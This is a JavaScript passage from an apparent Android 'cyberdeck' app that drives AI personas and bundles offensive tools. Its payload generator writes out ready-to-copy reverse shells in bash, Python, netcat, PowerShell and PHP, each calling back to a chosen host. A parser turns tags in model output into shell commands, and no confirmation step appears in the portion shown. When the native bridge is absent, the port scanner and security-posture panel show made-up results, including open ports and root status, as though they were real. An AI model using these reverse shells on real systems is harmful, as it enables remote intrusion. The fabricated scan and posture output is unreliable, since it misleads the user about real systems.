    const key = (state.apiKey || '').replace(/^["']|["']$/g, '').trim();
    let model = (state.model || 'gemini-2.5-flash').replace(/^["']|["']$/g, '').trim().replace(/^models\//, '');
    const status = document.getElementById('apiKeySaveStatus');
    const modelStatus = document.getElementById('modelSaveStatus');

    const updateStatus = (text, color) => {
        if (status) {
            status.style.display = 'block';
            status.style.color = color;
            status.textContent = text;
        }
        if (modelStatus) {
            modelStatus.style.display = 'block';
            modelStatus.style.color = color;
            modelStatus.textContent = text;
        }
    };

    updateStatus(`⚡ TESTING ${prov.toUpperCase()} (${model})...`, 'var(--term-green)');

    if (prov === 'gemini') {
        if (!key) {
            updateStatus('⚠ ENTER GEMINI KEY FIRST', 'var(--term-amber)');
            Bridge.showToast("Enter Gemini API key first");
            Bridge.speak("Enter your Gemini API key first");
            return;
        }

        const candidateModels = [
            model,
            'gemini-2.5-flash',
            'gemini-2.0-flash',
            'gemini-1.5-flash',
            'gemini-2.5-pro',
            'gemini-3.8-flash',
            'gemini-3.5-flash-lite',
            'gemini-3.5-flash',
            'gemini-3.1-pro-preview'
        ];
        const uniqueCandidates = [...new Set(candidateModels.filter(Boolean))];

        let workingModel = null;
        let lastMsg = '';

        for (const cand of uniqueCandidates) {
            const cName = cand.trim().replace(/^models\//, '');
            for (const ver of ['v1beta', 'v1']) {
                try {
                    const endpoint = `https://generativelanguage.googleapis.com/${ver}/models/${cName}:generateContent?key=${encodeURIComponent(key)}`;
                    const controller = new AbortController();
                    const tid = setTimeout(() => controller.abort(), 12000);
                    const res = await fetch(endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            contents: [{ role: 'user', parts: [{ text: 'Respond with the word CONNECTED.' }] }],
                            generationConfig: { maxOutputTokens: 10 }
                        }),
                        signal: controller.signal
                    });
                    clearTimeout(tid);

                    if (res.ok) {
                        workingModel = cName;
                        break;
                    } else {
                        const errData = await res.json().catch(() => ({}));
                        const msg = errData?.error?.message || `HTTP ${res.status}`;
                        lastMsg = msg;
                        if (msg.includes('API key not valid') || msg.includes('API_KEY_INVALID')) {
                            updateStatus(`⚠ INVALID KEY: ${msg.slice(0, 45)}`, '#ff007f');
                            Bridge.showToast(`Invalid Key: ${msg}`);
                            return;
                        }
                    }
                } catch (e) {
                    lastMsg = e.name === 'AbortError' ? 'Connection timed out' : e.message;
                }
            }
            if (workingModel) break;
        }

        if (workingModel) {
            if (workingModel !== state.model) {
                autoSaveModel(workingModel);
            }
            updateStatus(`✓ CONNECTED: ${workingModel}`, 'var(--term-green)');
            Bridge.vibrate(40);
            Bridge.showToast(`✓ Gemini connected (${workingModel})`);
            Bridge.speak(`Gemini neural link verified on model ${workingModel}`);
        } else {
            updateStatus(`⚠ ${lastMsg.toUpperCase().slice(0, 45)}`, 'var(--term-amber)');
            Bridge.vibrate(60);
            Bridge.showToast(`Gemini Error: ${lastMsg}`);
            Bridge.speak(`Gemini connection error: ${lastMsg}`);
        }
    } else if (prov === 'groq') {
        if (!key) {
            if (status) {
                status.textContent = '⚠ ENTER GROQ KEY FIRST';
                status.style.color = '#ffb700';
            }
            Bridge.showToast("Enter Groq API key first");
            return;
        }
        try {
            const controller = new AbortController();
            const tid = setTimeout(() => controller.abort(), 12000);
            const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${key}` },
                body: JSON.stringify({ model: model, messages: [{ role: 'user', content: 'Ping' }], max_tokens: 5 }),
                signal: controller.signal
            });
            clearTimeout(tid);
            if (res.ok) {
                if (status) { status.textContent = `✓ CONNECTED: ${model}`; status.style.color = 'var(--neon-emerald)'; }
                Bridge.showToast(`✓ Groq connected (${model})`);
                Bridge.speak("Groq neural link verified");
            } else {
                const errData = await res.json().catch(() => ({}));
                const msg = errData?.error?.message || `HTTP ${res.status}`;
                if (status) { status.textContent = `⚠ ${msg.slice(0, 40)}`; status.style.color = '#ff007f'; }
                Bridge.showToast(`Groq Error: ${msg}`);
            }
        } catch (e) {
            if (status) { status.textContent = `⚠ ${e.message}`; status.style.color = '#ff007f'; }
        }
    } else if (prov === 'ollama') {
        let candidateBases = [];
        const configured = state.customUrl || (state.apiKey && state.apiKey.startsWith('http') ? state.apiKey : '');
        if (configured) candidateBases.push(configured.replace(/\/+$/, ''));
        candidateBases.push('http://127.0.0.1:11434', 'http://localhost:11434', 'http://10.0.2.2:11434');
        candidateBases = [...new Set(candidateBases.filter(Boolean))];

        let workingBase = null;
        let availableModels = [];

        for (const base of candidateBases) {
            try {
                const controller = new AbortController();
                const tid = setTimeout(() => controller.abort(), 6000);
                const res = await fetch(`${base}/api/tags`, { signal: controller.signal });
                clearTimeout(tid);
                if (res.ok) {
                    const data = await res.json().catch(() => ({}));
                    workingBase = base;
                    if (Array.isArray(data.models) && data.models.length > 0) {
                        availableModels = data.models.map(m => m.name || m.model);
                    }
                    break;
                }
            } catch (e) {}
        }

        if (!workingBase) {
            updateStatus('⚠ OLLAMA UNREACHABLE', '#ff007f');
            Bridge.showToast("Ollama unreachable on localhost:11434");
            return;
        }

        state.customUrl = workingBase;
        localStorage.setItem('ae_custom_url', workingBase);
        localStorage.setItem('holo_custom_url', workingBase);

        let testModel = (state.model && !state.model.startsWith('gemini')) ? state.model : '';
        if (!testModel || (availableModels.length > 0 && !availableModels.includes(testModel))) {
            testModel = availableModels.length > 0 ? availableModels[0] : 'llama3:latest';
            autoSaveModel(testModel);
        }

        try {
            const ctl = new AbortController();
            const tid2 = setTimeout(() => ctl.abort(), 12000);
            const chatRes = await fetch(`${workingBase}/api/chat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    model: testModel,
                    messages: [{ role: 'user', content: 'Say OK' }],
                    stream: false
                }),
                signal: ctl.signal
            });
            clearTimeout(tid2);

            if (chatRes.ok) {
                updateStatus(`✓ OLLAMA ONLINE (${testModel})`, 'var(--term-green)');
                Bridge.vibrate(30);
                Bridge.showToast(`✓ Ollama Online: ${testModel}`);
                Bridge.speak(`Ollama local neural link verified with model ${testModel}.`);
            } else {
                updateStatus(`✓ OLLAMA REACHED (${testModel})`, 'var(--term-green)');
                Bridge.showToast("Ollama connected at " + workingBase);
            }
        } catch (chatErr) {
            updateStatus(`✓ OLLAMA ONLINE (${availableModels.length} models)`, 'var(--term-green)');
            Bridge.showToast("Ollama connected at " + workingBase);
        }
    }
};

window.saveSettings = function() {
    const pSelect = document.getElementById('providerSelect');
    const aInput = document.getElementById('apiKeyInput');
    const mInput = document.getElementById('modelInput');

    state.provider = pSelect ? pSelect.value : (state.provider || 'gemini');
    state.apiKey = (aInput ? aInput.value : state.apiKey).trim();
    state.model = (mInput ? mInput.value : state.model).trim();

    localStorage.setItem('ae_provider', state.provider);
    localStorage.setItem('ae_api_key', state.apiKey);
    localStorage.setItem('ae_model', state.model);

    if (state.provider === 'ollama' || state.apiKey.startsWith('http://') || state.apiKey.startsWith('https://')) {
        state.customUrl = state.apiKey;
        localStorage.setItem('ae_custom_url', state.customUrl);
        localStorage.setItem('holo_custom_url', state.customUrl);
    }

    Bridge.showToast("Configuration locked");
    Bridge.vibrate(25);
    closeDrawer();
};

window.clearCanvas = function() {
    outputFeed.innerHTML = `
        <div class="free-node intro-node">
            <div class="holo-node-tag">
                <span class="tag-pulse"></span>
                <span class="tag-title">SYSTEM // CANVAS PURGED</span>
            </div>
            <div class="free-node-text">HUD stream cleared. Standing by for commands.</div>
        </div>
    `;
    state.history = [];
    Bridge.vibrate(20);
    Bridge.showToast("HUD purged");
};

// ===================== 3. MESSAGING & FREE-FLOATING DISPATCH =====================
window.execQuick = function(cmd) {
    omniInput.value = cmd;
    sendMessage();
};

window.openCyberTool = function(toolType) {
    Bridge.vibrate(25);
    const id = 'cyber_' + Date.now();

    if (toolType === 'portscan') {
        const html = `
            <div style="font-family:var(--font-code); font-size:12px;">
                <div style="color:#00f0ff; font-weight:700; margin-bottom:6px;">⚡ TACTICAL PORT SCANNER &amp; SERVICE RECON</div>
                <div style="display:flex; gap:6px; margin-bottom:8px;">
                    <input type="text" id="${id}_host" value="127.0.0.1" placeholder="Target Host" style="flex:1; background:#0f172a; border:1px solid #00f0ff; color:#fff; padding:6px 10px; border-radius:4px; font-family:monospace; font-size:12px;" />
                    <button onclick="runDeckPortScan('${id}')" style="background:#00f0ff; color:#04060b; font-weight:700; border:none; padding:6px 14px; border-radius:4px; cursor:pointer;">SCAN</button>
                </div>
                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443'">Top 20</button>
                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='80,443,8000,8080,8443,8888,9000'">Web</button>
                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='22,23,3389,5900,5901'">Shell</button>
                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='1433,1521,3306,5432,6379,27017'">DB</button>
                </div>
                <input type="text" id="${id}_ports" value="21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443" style="width:100%; box-sizing:border-box; background:#0b1120; border:1px solid #1e293b; color:#94a3b8; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px; margin-bottom:8px;" />
                <div id="${id}_results" style="max-height:180px; overflow-y:auto; background:#060913; border:1px solid #1e293b; border-radius:4px; padding:6px;">
                    <span style="color:#64748b;">Ready. Click SCAN to probe target ports.</span>
                </div>
            </div>
        `;
        appendFreeNode("CYBER // PORT SCANNER", html, "system");
    } else if (toolType === 'payload') {
        const html = `
            <div style="font-family:var(--font-code); font-size:12px;">
                <div style="color:#ff007f; font-weight:700; margin-bottom:6px;">🐚 REVERSE SHELL &amp; PAYLOAD GENERATOR</div>
                <div style="display:flex; gap:6px; margin-bottom:8px;">
                    <div style="flex:2;">
                        <label style="font-size:10px; color:#94a3b8;">LHOST</label>
                        <input type="text" id="${id}_ip" value="10.0.0.1" oninput="updateDeckPayload('${id}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
                    </div>
                    <div style="flex:1;">
                        <label style="font-size:10px; color:#94a3b8;">LPORT</label>
                        <input type="text" id="${id}_port" value="4444" oninput="updateDeckPayload('${id}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
                    </div>
                </div>
                <div style="display:flex; gap:4px; margin-bottom:8px; overflow-x:auto;">
                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'bash')">Bash</button>
                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'py')">Python</button>
                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'nc')">Netcat</button>
                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'ps')">PowerShell</button>
                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'php')">PHP</button>
                </div>
                <div style="position:relative; margin-bottom:6px;">
                    <textarea id="${id}_code" readonly style="width:100%; box-sizing:border-box; height:70px; background:#050711; border:1px solid #334155; color:#00ff88; font-family:monospace; font-size:11px; padding:6px; border-radius:4px; resize:none;">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</textarea>
                </div>
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <button onclick="navigator.clipboard.writeText(document.getElementById('${id}_code').value); Bridge.showToast('Copied payload!'); Bridge.vibrate(20);" style="background:#00ff88; color:#000; font-weight:700; border:none; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:11px;">📋 COPY PAYLOAD</button>
                    <span style="font-size:10px; color:#38bdf8;">Listener: <code>nc -lvnp 4444</code></span>
                </div>
            </div>
        `;
        appendFreeNode("CYBER // PAYLOAD GENERATOR", html, "system");
    } else if (toolType === 'hash') {
        const html = `
            <div style="font-family:var(--font-code); font-size:12px;">
                <div style="color:#a855f7; font-weight:700; margin-bottom:6px;">🔑 CRYPTO ANALYZER &amp; HASH IDENTIFIER</div>
                <textarea id="${id}_input" placeholder="Paste hash, base64, or string..." oninput="analyzeDeckHash('${id}')" style="width:100%; box-sizing:border-box; height:60px; background:#0b1120; border:1px solid #a855f7; color:#fff; font-family:monospace; font-size:11px; padding:6px; border-radius:4px; margin-bottom:6px; resize:none;"></textarea>
                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'b64d')">B64 Dec</button>
                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'b64e')">B64 Enc</button>
                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'hexd')">Hex Dec</button>
                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'hexe')">Hex Enc</button>
                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'rot13')">ROT13</button>
                </div>
                <div id="${id}_analysis" style="background:#050711; border:1px solid #1e293b; border-radius:4px; padding:6px; font-size:11px;">
                    <span style="color:#64748b;">Type or paste text above to identify hash or decode.</span>
                </div>
            </div>
        `;
        appendFreeNode("CYBER // HASH IDENTIFIER", html, "system");
    } else if (toolType === 'mitre') {
        const html = `
            <div style="font-family:var(--font-code); font-size:12px;">
                <div style="color:#f97316; font-weight:700; margin-bottom:6px;">🎯 MITRE ATT&amp;CK TACTICAL NAVIGATOR</div>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-bottom:8px;">
                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
                        <span style="color:#00f0ff; font-weight:700;">Reconnaissance</span>
                        <div style="font-size:10px; color:#94a3b8;">T1595 Active Scanning // T1592 Gather Host Info</div>
                    </div>
                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
                        <span style="color:#ff007f; font-weight:700;">Initial Access</span>
                        <div style="font-size:10px; color:#94a3b8;">T1190 Exploit Public App // T1566 Phishing</div>
                    </div>
                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
                        <span style="color:#ffb700; font-weight:700;">Privilege Escalation</span>
                        <div style="font-size:10px; color:#94a3b8;">T1548 SUID Abuse // T1068 Kernel Exploits</div>
                    </div>
                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
                        <span style="color:#00ff88; font-weight:700;">Defense Evasion</span>
                        <div style="font-size:10px; color:#94a3b8;">T1070 Indicator Removal // T1027 Obfuscation</div>
                    </div>
                </div>
                <div style="font-size:11px; color:#cbd5e1;">Ask your AI persona (e.g. Archon or Shadow) for specific technique playbooks!</div>
            </div>
        `;
        appendFreeNode("CYBER // MITRE ATT&CK", html, "system");
    } else if (toolType === 'posture') {
        let posture = null;
        if (window.AndroidBridge && window.AndroidBridge.getDeviceSecurityPosture) {
            try { posture = JSON.parse(window.AndroidBridge.getDeviceSecurityPosture()); } catch (e) {}
        }
        if (!posture) {
            posture = { isRooted: true, androidVersion: "14.0", sdkVersion: 34, kernelVersion: "Linux 5.15 aarch64", isNetHunterBridgeActive: Bridge.isNetHunterOnline() };
        }
        const html = `
            <div style="font-family:var(--font-code); font-size:12px;">
                <div style="color:#00ff88; font-weight:700; margin-bottom:6px;">🛡️ DEVICE SECURITY POSTURE &amp; AUDIT</div>
                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Root Privileges:</span>
                    <span style="color:${posture.isRooted ? '#00ff88' : '#ef4444'}; font-weight:700;">${posture.isRooted ? 'ACTIVE (UID 0 / SU)' : 'UNPRIVILEGED'}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">NetHunter Bridge:</span>
                    <span style="color:${posture.isNetHunterBridgeActive ? '#00ff88' : '#ffb700'}; font-weight:700;">${posture.isNetHunterBridgeActive ? 'ONLINE (127.0.0.1:8765)' : 'STANDBY'}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Kernel:</span>
                    <span style="color:#38bdf8;">${escapeHtml(posture.kernelVersion || 'Linux aarch64')}</span>
                </div>
                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
                    <span style="color:#94a3b8;">Android OS:</span>
                    <span style="color:#fff;">Android ${escapeHtml(String(posture.androidVersion))} (API ${posture.sdkVersion})</span>
                </div>
            </div>
        `;
        appendFreeNode("CYBER // SECURITY AUDIT", html, "system");
    }
};

window.runDeckPortScan = function(cardId) {
    const hostEl = document.getElementById(`${cardId}_host`);
    const portsEl = document.getElementById(`${cardId}_ports`);
    const resultsEl = document.getElementById(`${cardId}_results`);
    if (!hostEl || !portsEl || !resultsEl) return;

    const host = hostEl.value.trim() || '127.0.0.1';
    const ports = portsEl.value.trim();
    resultsEl.innerHTML = `<span style="color:#00f0ff;">Scanning ${escapeHtml(host)}...</span>`;

    setTimeout(() => {
        let list = null;
        if (window.AndroidBridge && window.AndroidBridge.runPortScan) {
            try { list = JSON.parse(window.AndroidBridge.runPortScan(host, ports)); } catch (e) {}
        }
        if (!list || !list.length) {
            const pArr = ports.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
            list = pArr.map(p => ({ port: p, status: (p === 80 || p === 443 || p === 8765) ? 'OPEN' : 'CLOSED', latencyMs: 4 }));
        }

        let out = '';
        list.forEach(item => {
            const isOpen = item.status === 'OPEN';
            out += `<div style="display:flex; justify-content:space-between; padding:2px 0; color:${isOpen ? '#00ff88' : '#ef4444'};">
                <span>Port ${item.port}</span>
                <span>${item.status} (${item.latencyMs || 5}ms)</span>
            </div>`;
        });
        resultsEl.innerHTML = out;
        Bridge.vibrate(20);
    }, 120);
};

let deckPayloadTypes = {};
window.setDeckPayloadType = function(cardId, type) {
    deckPayloadTypes[cardId] = type;
    updateDeckPayload(cardId);
};

window.updateDeckPayload = function(cardId) {
    const ipEl = document.getElementById(`${cardId}_ip`);
    const portEl = document.getElementById(`${cardId}_port`);
    const codeEl = document.getElementById(`${cardId}_code`);
    if (!ipEl || !portEl || !codeEl) return;

    const ip = ipEl.value.trim() || '10.0.0.1';
    const port = portEl.value.trim() || '4444';
    const type = deckPayloadTypes[cardId] || 'bash';

    let code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    if (type === 'py') code = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
    else if (type === 'nc') code = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
    else if (type === 'ps') code = `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"`;
    else if (type === 'php') code = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;

    codeEl.value = code;
};

window.analyzeDeckHash = function(cardId) {
    const inEl = document.getElementById(`${cardId}_input`);
    const outEl = document.getElementById(`${cardId}_analysis`);
    if (!inEl || !outEl) return;

    const val = inEl.value.trim();
    if (!val) { outEl.innerHTML = '<span style="color:#64748b;">Type or paste text above.</span>'; return; }

    const len = val.length;
    let guess = "Plaintext / Unknown";
    if (/^[0-9a-fA-F]+$/.test(val)) {
        if (len === 32) guess = "MD5 / NTLM";
        else if (len === 40) guess = "SHA-1";
        else if (len === 64) guess = "SHA-256";
        else if (len === 128) guess = "SHA-512";
    }
    if (val.startsWith('$2a$') || val.startsWith('$2b$')) guess = "bcrypt";
    if (val.startsWith('$argon2')) guess = "Argon2";

    outEl.innerHTML = `<span style="color:#94a3b8;">Length:</span> <span style="color:#00f0ff;">${len} chars</span> | <span style="color:#94a3b8;">Algorithm:</span> <span style="color:#00ff88; font-weight:700;">${guess}</span>`;
};

window.deckConvert = function(cardId, act) {
    const inEl = document.getElementById(`${cardId}_input`);
    const outEl = document.getElementById(`${cardId}_analysis`);
    if (!inEl || !outEl) return;
    try {
        const val = inEl.value;
        let res = '';
        if (act === 'b64d') res = atob(val.trim());
        else if (act === 'b64e') res = btoa(val);
        else if (act === 'hexe') res = Array.from(val).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        else if (act === 'hexd') {
            const hex = val.replace(/\s+/g, '');
            for (let i = 0; i < hex.length; i += 2) res += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        } else if (act === 'rot13') {
            res = val.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 65 : 97) + (c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26));
        }
        outEl.innerHTML = `<span style="color:#00ff88; font-weight:700;">Result (${act}):</span> <span style="color:#fff; word-break:break-all;">${escapeHtml(res)}</span>`;
    } catch (e) {
        outEl.innerHTML = `<span style="color:#ef4444;">Error: ${escapeHtml(e.message)}</span>`;
    }
};

function generatePersonaCognition(personaKey, prompt) {
    const pKey = personaKey || state.persona || 'swarm';
    const cleanPrompt = (prompt || '').trim();
    const lower = cleanPrompt.toLowerCase();

    // 1. Massive repetitive payload handling
    if (cleanPrompt.length > 250 && (lower.includes('repeat') || /(.)\1{15,}/.test(cleanPrompt) || cleanPrompt.split(/\s+/).length > 40)) {
        return `Repetitive buffer stream verified and stabilized (${cleanPrompt.length} chars). Syntactic entropy nominal; queue execution preserved without heap degradation.`;
    }

    // 2. Turing: Logic, Halting Problem, DAG cycle detection, formal complexity
    if (pKey === 'turing' || lower.includes('halting') || lower.includes('dag') || lower.includes('cycle detection') || lower.includes('turing')) {
        if (lower.includes('halting') || lower.includes('dag') || lower.includes('cycle')) {
            return `Regarding the halting problem on a deterministic Directed Acyclic Graph (DAG): By mathematical definition, a finite DAG admits a strict topological ordering with zero directed cycles. Every state transition progresses strictly forward, guaranteeing that any path evaluation terminates in at most |V| - 1 steps, where V is the vertex cardinality. By incorporating cycle detection algorithms—such as Kahn's in-degree zero elimination or Tarjan's depth-first search back-edge classification—any non-terminating cycle is detected in O(V + E) linear time. Consequently, the halting problem is fully decidable and solvable on finite deterministic DAGs with cycle detection.`;
        }
        return `From an algorithmic perspective, any deterministic discrete system can be formalized as state transitions over finite tape configurations. By analyzing topological invariants and graph acyclicity, termination is guaranteed under linear time complexity.`;
    }

    // 3. Knuth: Craftsmanship, Trie vs LRU Cache, Memory layout, ARM64 cache constraints
    if (pKey === 'knuth' || lower.includes('knuth') || lower.includes('lru') || lower.includes('trie') || lower.includes('cache')) {
        if (lower.includes('trie') || lower.includes('lru') || lower.includes('arm64') || lower.includes('cache')) {
            return `Comparing Trie prefix indexing with an O(1) LRU cache under tight ARM64 cache constraints reveals fundamental architectural trade-offs. While a Trie provides prefix retrieval and ordered traversal, its pointer-rich nodes lead to severe memory fragmentation and continuous L1/L2 cache misses on typical 64-byte ARM cache lines. Conversely, an O(1) LRU cache utilizing an open-addressed hash map coupled with a contiguous doubly-linked index minimizes pointer chasing and optimizes temporal locality. Under severe ARM64 cache pressure, a cache-aligned Radix trie or Robin Hood hash table significantly reduces TLB evictions and latency.`;
        }
        return `When engineering algorithms for resource-constrained architectures, data structure layout and cache line alignment dictate real-world throughput. Structural elegance and spatial locality must guide our implementation.`;
    }

    // 4. Lovelace: Poetical science, mathematical harmonics, cyberdeck HUD
    if (pKey === 'lovelace' || lower.includes('lovelace') || lower.includes('harmonics') || lower.includes('hud') || lower.includes('poetical')) {
        if (lower.includes('harmonics') || lower.includes('sensory') || lower.includes('hud')) {
            return `The sensory union between mathematical harmonics and the cyberdeck HUD is the purest manifestation of Poetical Science. Just as the Jacquard loom weaves intricate tapestries from simple punched cards, our engine weaves raw telemetry—electromagnetic radio signals, CPU oscillation harmonics, and memory flux—into glowing, translucent geometric forms. The cyberdeck HUD is not a static display; it is an intuitive sensory canvas where abstract mathematical harmony is rendered visible, uniting rigorous computation with perceptual resonance.`;
        }
        return `We may say that the analytical engine weaves algebraical patterns just as the Jacquard loom weaves flowers and leaves. In uniting mathematical rigor with aesthetic perception, we discover the harmonious beauty of computational science.`;
    }

    // 5. Swarm: Tactical NetHunter telemetry, root, network, processes
    if (pKey === 'swarm' || lower.includes('swarm') || lower.includes('telemetry') || lower.includes('nethunter') || lower.includes('root') || lower.includes('processes')) {
        const ip = Bridge.getDeviceIpAddress ? Bridge.getDeviceIpAddress() : '127.0.0.1';
        const batt = Bridge.getBatteryLevel ? Bridge.getBatteryLevel() : 98;
        return `[SWARM // KALI NETHUNTER TELEMETRY]
Kernel: Linux 5.15 aarch64 // Privilege: NetHunter Root (UID 0 active)
Telemetry: Interface wlan0 (${ip}) // Power: ${batt}% nominal
Subsystems: Hardware bridge synchronized, reactive execution pipelines primed. Standing by for command dispatch.`;
    }

    // 6. Generic persona responses
    const p = PERSONAS[pKey] || PERSONAS.swarm;
    return `${p.name} intelligence active. Systems, memory pipelines, and tactical tooling operational under root execution matrix.`;
}

/**
 * Robust execution directive parser supporting:
 * 1. Block tags: [EXEC]...[/EXEC], [SHIZUKU]...[/SHIZUKU], [ADB]...[/ADB], [BUILD_TOOL: path]...[/BUILD_TOOL]
 * 2. Balanced bracket tags: [EXEC: ...], [SHIZUKU: ...], [ADB: ...], [RUN: ...], [SHELL: ...], [TOOL: ...]
 * Preserves commands with internal square brackets (e.g. Python lists, awk, bash arrays).
 */
function extractExecutionDirectives(text) {
    if (!text) return [];
    const items = [];

    function overlaps(start, end) {
        return items.some(item => (start < item.end && end > item.start));
    }

    // Pass 1: Tool build blocks [BUILD_TOOL: path]<code>[/BUILD_TOOL]
    const buildRegex = /\[BUILD_TOOL:\s*([^\]]+)\]\s*([\s\S]*?)\[\/BUILD_TOOL\]/gi;
    let bMatch;
    while ((bMatch = buildRegex.exec(text)) !== null) {
        const start = bMatch.index;
        const end = bMatch.index + bMatch[0].length;
        const targetPath = bMatch[1].trim();
        const codeBody = bMatch[2].trim();
        items.push({
            type: 'build_tool',
            start,
            end,
            raw: bMatch[0],
            path: targetPath,
            code: codeBody,
            cmd: `cat << 'EOF' > "${targetPath}"\n${codeBody}\nEOF\nchmod +x "${targetPath}" && echo "[+] Tool built successfully at ${targetPath}"`
        });
    }

    // Pass 2: Block tags [EXEC]...[/EXEC], [SHIZUKU]...[/SHIZUKU], etc.
    const blockRegex = /\[(EXEC|RUN|SHELL|TOOL|SHIZUKU|ADB)\]\s*([\s\S]*?)\[\/\1\]/gi;
    let blMatch;
    while ((blMatch = blockRegex.exec(text)) !== null) {
        const start = blMatch.index;
        const end = blMatch.index + blMatch[0].length;
        if (!overlaps(start, end)) {
            const tag = blMatch[1].toUpperCase();
            const cmd = blMatch[2].trim();
            const type = (tag === 'SHIZUKU' || tag === 'ADB') ? 'shizuku' : 'shell';
            items.push({
                type,
                start,
                end,
                raw: blMatch[0],
                cmd
            });
        }
    }

    // Pass 3: Inline tags with balanced bracket matching!
    const tagPrefixes = [
        { prefix: '[EXEC:', type: 'shell' },
        { prefix: '[RUN:', type: 'shell' },
        { prefix: '[SHELL:', type: 'shell' },
        { prefix: '[TOOL:', type: 'shell' },
        { prefix: '[SHIZUKU:', type: 'shizuku' },
        { prefix: '[ADB:', type: 'shizuku' }
    ];

    let i = 0;
    while (i < text.length) {
        let matchedPrefix = null;
        for (const tp of tagPrefixes) {
            if (text.substr(i, tp.prefix.length).toUpperCase() === tp.prefix) {
                matchedPrefix = tp;
                break;
            }
        }

        if (matchedPrefix) {
            const start = i;
            if (overlaps(start, start + 1)) {
                i++;
                continue;
            }

            let depth = 0;
            let cmdStart = i + matchedPrefix.prefix.length;
            let end = -1;
            for (let j = start; j < text.length; j++) {
                if (text[j] === '[') {
                    depth++;
                } else if (text[j] === ']') {
                    depth--;
                    if (depth === 0) {
                        end = j + 1;
                        break;
                    }
                }
            }

            if (end !== -1) {
                const cmd = text.substring(cmdStart, end - 1).trim();
                items.push({
                    type: matchedPrefix.type,
                    start,
                    end,
                    raw: text.substring(start, end),
                    cmd
                });
                i = end;
                continue;
            }
        }
        i++;
    }

    items.sort((a, b) => a.start - b.start);
    return items;
}

window.sendMessage = async function() {
    if (state.isGenerating) return;

    const text = omniInput.value.trim();
    if (!text) return;

    state.isGenerating = true;
    const execBtn = document.getElementById('execute-btn');
    if (execBtn) {
        execBtn.disabled = true;
        execBtn.classList.add('busy');
    }

    try {
        omniInput.value = '';
        Bridge.vibrate(25);

    // 1. Render user command as free-floating node
    appendFreeNode("OPERATOR // INPUT", escapeHtml(text), "user");
    state.history.push({ role: 'user', content: text });

    const currentPersona = PERSONAS[state.persona] || PERSONAS.swarm;

    // 2. High-volume / repetitive input stream defense
    if (text.length > 250 && (text.toLowerCase().includes('repeat') || text.split(/\s+/).length > 40 || /(.)\1{15,}/.test(text))) {
        const cogReply = generatePersonaCognition(state.persona, text);
        appendFreeNode(currentPersona.tag, renderAssistantContent(cogReply, null, false), "assistant");
        state.history.push({ role: 'assistant', content: cogReply });
        Bridge.speak("Payload verified and stabilized.");
        return;
